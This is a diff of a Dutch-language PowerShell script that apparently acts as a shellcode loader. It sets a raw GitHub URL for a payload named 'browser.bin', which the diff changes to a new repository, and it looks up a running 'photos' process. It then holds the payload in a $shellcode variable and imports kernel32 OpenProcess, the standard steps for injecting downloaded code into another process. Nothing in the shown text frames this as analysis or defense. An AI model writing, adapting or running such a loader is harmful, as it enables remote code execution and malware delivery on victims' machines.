@@ -1,10 +1,11 @@
-$url = "https://raw.githubusercontent.com/MJ06-BP/bp/main/browser.bin"
+$url = "https://raw.githubusercontent.com/Zakelijkgg/niks/main/browser.bin"
+$Host.UI.RawUI.WindowTitle = "Gemaakt door M-J"
 if (-not [Environment]::Is64BitProcess) {
     pause
     exit
 }
-Write-Host "---Gemaakt door MJBP---" -ForegroundColor Yellow
-Write-Host "[+] Zoeken naar proces" -ForegroundColor Cyan
+
+Write-Host "[+] Zoeken naar proces..." -ForegroundColor Cyan
 
 $edgeProcesses = Get-Process -Name "photos" -ErrorAction SilentlyContinue
 
@@ -28,7 +29,6 @@ try {
     exit
 }
 $size = $shellcode.Length
-
 Add-Type -MemberDefinition @"
     [DllImport("kernel32.dll")]
     public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
